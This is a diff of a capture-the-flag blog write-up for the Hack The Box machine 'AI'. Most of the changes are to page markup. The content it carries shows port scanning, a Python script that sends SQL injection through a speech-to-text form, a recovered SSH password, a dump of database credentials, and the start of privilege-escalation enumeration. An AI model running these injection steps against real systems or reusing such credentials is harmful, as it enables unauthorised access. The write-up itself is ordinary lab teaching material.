@@ -20,13 +20,9 @@
 
 
 
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
 
 
-
-<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">
-
+<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.cd71908e0ee72a8733aeb9216405d664d48b2598bb3b750ec082bbf1b5b458cc.css" integrity="sha256-zXGQjg7nKoczrrkhZAXWZNSLJZi7O3UOwIK78bW0WMw=">
 
 
 
@@ -34,17 +30,15 @@
     <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
     <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
-    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="">
     <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
-    <meta name="msapplication-TileColor" content="#1b1c1d">
-    <meta name="theme-color" content="#1b1c1d">
-
+    <meta name="msapplication-TileColor" content="">
 
 
 <meta itemprop="name" content="HTB - Ai">
 <meta itemprop="description" content="Funny SQLI over a voice recognition engine. Proxies and python helper to facilitate SQLI exploitation and get user credentials. Linpeas to identify jdwp privesc and ssh forwarding with JDWP-shellifier and Java debugger"><meta itemprop="datePublished" content="2020-02-10T00:54:12+08:00" />
 <meta itemprop="dateModified" content="2020-02-10T00:54:12+08:00" />
-<meta itemprop="wordCount" content="1463"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
+<meta itemprop="wordCount" content="1261"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
 <meta itemprop="keywords" content="sqli,linPeas,jdwp,ajp,sshcli,port-forwarding,jdb," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>
@@ -79,10 +73,14 @@
 
 
 
+
+
+
     </head>
 
     
         <body>
+    
     
         <div class="container">
             <header class="header">
@@ -91,7 +89,8 @@
     <div class="logo">
         
             <span class="logo__mark">&gt;</span>
-            <span class="logo__text"># cd /draft/</span>
+            <span class="logo__text ">
+                # cd /draft/</span>
             <span class="logo__cursor" style=
                   "
                    
@@ -116,6 +115,11 @@
                     </svg>
                 </span>
             
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
         </span>
     </span>
 </header>
@@ -126,42 +130,11 @@
   <main class="post">
 
     <div class="post-info">
-      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
-  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-  <line x1="16" y1="2" x2="16" y2="6"></line>
-  <line x1="8" y1="2" x2="8" y2="6"></line>
-  <line x1="3" y1="10" x2="21" y2="10"></line>
-</svg>
-
-  2020-02-09 
+      <p>
 
 
-  
- |
-
-      
-
-      
-
-      
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-linux/">htb-linux</a></span>
         
-        |
-
-
-      
-        |
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
-        
-        |
-
-
-      
-
+      </p>
     </div>
 
     <article>
@@ -194,32 +167,15 @@
       
         <figure class="post-cover">
           <img src="https://www.hackthebox.eu/images/logo-htb.svg" alt="HTB - Ai" />
-
+          
           
         </figure>
       
 
+      
+
       <div class="post-content">
-        <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Nmap 7.60 scan initiated Sun Feb  2 09:57:19 2020 as: nmap -sC -sV -oA nmap/AI 10.10.10.163</span>
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Nmap 7.60 scan initiated Sun Feb  2 09:57:19 2020 as: nmap -sC -sV -oA nmap/AI 10.10.10.163</span>
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.163
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.26s latency<span style="color:#ff79c6">)</span>.
 </span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">997</span> closed ports
@@ -234,53 +190,9 @@
 </span></span><span style="display:flex;"><span>|_http-title: Hello AI!
 </span></span><span style="display:flex;"><span>10004/tcp filtered emcrmirccd
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>edit /etc/hosts and add the row &lsquo;10.10.10.163 ai.htb&rsquo;</p>
+</span></span></code></pre></div><p>edit /etc/hosts and add the row &lsquo;10.10.10.163 ai.htb&rsquo;</p>
 <p>We use gobuster to look for additional php pages from a dictionary of most common pages</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/OJ/gobuster.git
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/OJ/gobuster.git
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> gobuster/
 </span></span><span style="display:flex;"><span>ls gobusterdir/
 </span></span><span style="display:flex;"><span>go get github.com/OJ/gobuster
@@ -318,49 +230,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
 </span></span><span style="display:flex;"><span>2020/02/09 13:12:39 <span style="color:#8be9fd;font-style:italic">Finished</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>we find intelligence.php which gives us some hints on how to talk with the speech to text artificial intelligence.
+</span></span></code></pre></div><p>we find intelligence.php which gives us some hints on how to talk with the speech to text artificial intelligence.
 We need a text-to-speech implementation which is the closest to Microsoft US-male implementation.
 Trying with MacOsX <code>say</code>command is not successful and therefore we install festival on our docker machine.
 Because our docker does not have a graphic interface (X installed is not installed), We build another script <a href="./ai.py">ai.py</a> to submit the WAV file generated with festival.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://10.10.10.163/ai.php&#39;</span>
@@ -392,29 +266,10 @@ Because our docker does not have a graphic interface (X installed is not install
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span> (<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Query result : </span><span style="color:#f1fa8c">{</span>sql_query[<span style="color:#bd93f9">1</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">except</span>:
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>content)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>It is very useful to leverage Firefox Developer tools Network tab together with a custom python3 proxy
+</span></span></code></pre></div><p>It is very useful to leverage Firefox Developer tools Network tab together with a custom python3 proxy
 such as <a href="./http_proxy.py">http_proxy.py</a> or <a href="./tcp_proxy.py">tcp_proxy.py</a> to audit and analyze the http form POST.
 We could also have used Blurp-suite but it was more fun to code a little bit, and what if we can&rsquo;t use burp during an engagement?</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install festival
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install festival
 </span></span><span style="display:flex;"><span>virtualenv -p /usr/bin/pyhton3.8 .v3
 </span></span><span style="display:flex;"><span>. ./.v3/bin/activate
 </span></span><span style="display:flex;"><span>pip install requests
@@ -427,35 +282,8 @@ We could also have used Blurp-suite but it was more fun to code a little bit, an
 </span></span><span style="display:flex;"><span>python3 ai.py
 </span></span><span style="display:flex;"><span>Our understanding of your input is : &#39;union <span style="color:#ff79c6">select</span> username from users -- -
 </span></span><span style="display:flex;"><span>Query result : alexa
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We have now identify <code>alexa:H,Sq9t6}a&lt;)?q93_</code> and we use it to ssh into the user account</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh alexa@ai.htb
+</span></span></code></pre></div><p>We have now identify <code>alexa:H,Sq9t6}a&lt;)?q93_</code> and we use it to ssh into the user account</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh alexa@ai.htb
 </span></span><span style="display:flex;"><span>alexa@AI:~$ cat user.txt
 </span></span><span style="display:flex;"><span>c43*************************5e4b
 </span></span><span style="display:flex;"><span>alexa@AI:~$ <span style="color:#8be9fd;font-style:italic">cd</span> /var/www/html/
@@ -476,113 +304,43 @@ We could also have used Blurp-suite but it was more fun to code a little bit, an
 </span></span><span style="display:flex;"><span>| dbuser   | toor             |
 </span></span><span style="display:flex;"><span>| awsadm   | awsadm           |
 </span></span><span style="display:flex;"><span>+----------+------------------+
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Our machine IP address is 10.10.14.73, We download linpeas.sh and we start a python web server to upload the script remotely</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+</span></span></code></pre></div><p>Our machine IP address is 10.10.14.73, We download linpeas.sh and we start a python web server to upload the script remotely</p>
